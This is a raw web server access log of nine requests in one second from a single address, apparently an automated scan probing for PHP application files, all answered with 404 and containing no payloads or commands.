::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /gai/ucms/login.php HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /js/room.js HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /Public/mobile/js/config.js HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /Application/Basic/Static/css/customerselect.css HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /index/index/register1/type/1.html HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /Public/Home/statics/web/js/style.js HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /index3.php?m=Order&a=hetong&id=999999 HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /Public/js/chatmsg.js HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
::ffff:139.205.177.98 - - [27/Sep/2020:05:08:45 +0000] "GET /Public/Manage/js/cvphp.js HTTP/1.1" 404 160 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
